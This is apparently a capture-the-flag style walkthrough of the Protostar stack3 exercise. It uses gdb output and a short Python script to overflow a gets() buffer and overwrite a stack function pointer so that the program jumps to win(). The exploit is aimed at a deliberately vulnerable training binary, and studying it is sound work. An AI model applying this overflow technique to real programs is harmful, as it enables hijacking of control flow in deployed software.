# Flow Redirection
### Overwriting function pointers stored on the stack

The goal of this exercise is to try and get a function to execute when it isn't supposed to.

For this exercise, we will be using [Protostar's stack3 example](http://web.archive.org/web/20170419023355/https://exploit-exercises.com/protostar/stack3/) and we are going to perform a buffer overflow.

In this example, I have defined two functions: ````main()```` and ````win()````. Inside ````main()````, I have defined a variable, ````fp````, as 0. Then I say "if ````fp```` is anything other than 0, call it." I do not change the value of ````fp```` at any point in the program. Therefore: the only way ````fp()```` can be called, is if a buffer overflow attack has been successfully carried out.

Let's inspect the main function of the binary:

<pre>
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) <b>set disassembly-flavor intel</b>
(gdb) <b>disassemble main</b>
Dump of assembler code for function main:
0x08048438 <main+0>:    push   ebp
0x08048439 <main+1>:    mov    ebp,esp
0x0804843b <main+3>:    and    esp,0xfffffff0
0x0804843e <main+6>:    sub    esp,0x60
0x08048441 <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:   lea    eax,[esp+0x1c]
0x0804844d <main+21>:   mov    DWORD PTR [esp],eax
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    eax,0x8048560
0x08048461 <main+41>:   mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:   mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:   mov    DWORD PTR [esp],eax
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:   call   eax
0x08048477 <main+63>:   leave
0x08048478 <main+64>:   ret
End of assembler dump.
</pre>

Here we can see some familiar landmarks. For example: ````0x08048455```` contains the "Compare" instruction where we check to see if ````fp```` is 0. The next line contains the "Jump if Equal" instruction, which in theory, should never not be  called... since in the normal program flow, it's never being changed to something other than 0. The "Jump if Equal" jumps to ````0x8048477```` which is the end of the program. So, theoretically, all of the instructions in between the "je" and "leave" should never, ever execute.

Let's see if we can change that.

The function we want to execute is called ````win````. Let's find the memory address where it's stored.

<pre>
(gdb) <b>x win</b>
0x8048424 <win>:        0x83e58955
</pre>

Found it.

We'll remember ````0x8048424```` for later.

Let's run this thing, feed it some junk data, and see what happens.

<pre>
(gdb) <b>r</b>
Starting program: /opt/protostar/bin/stack3
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
calling function pointer, jumping to 0x51515151

Program received signal SIGSEGV, Segmentation fault.
0x51515151 in ?? ()
(gdb) <b>info registers</b>
eax            0x51515151       1364283729
ecx            0x0      0
edx            0xb7fd9340       -1208118464
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff74c       0xbffff74c
ebp            0xbffff7b8       0xbffff7b8
esi            0x0      0
edi            0x0      0
eip            0x51515151       0x51515151
eflags         0x210296 [ PF AF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
</pre>

Hey, cool! ````0x51515151```` in the ````eax```` register! We can use this to control the program flow. Instead of filling it with "Q"s, let's put the location of our ````win```` function in it.

And while we're at it, let's write a quick python script to make this easier than typing it out every time.

~~~~
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
ebp = struct.pack("I", 0x8048424)
print padding+ebp
~~~~

There, much better.

Let's pipe the output of this program to a file, and finally to our executable, and see what happens.

~~~~
python script.py > /tmp/exp
~~~~

Now to test:

<pre>
(gdb) <b>r < /tmp/exp</b>
Starting program: /opt/protostar/bin/stack3 < /tmp/exp
calling function pointer, jumping to 0x08048424
code flow successfully changed

Program exited with code 037.
</pre>

"code flow successfully changed"

Hooray! We ran a function that shouldn't have been able to run! Buffer overflow attack: SUCCESSFUL.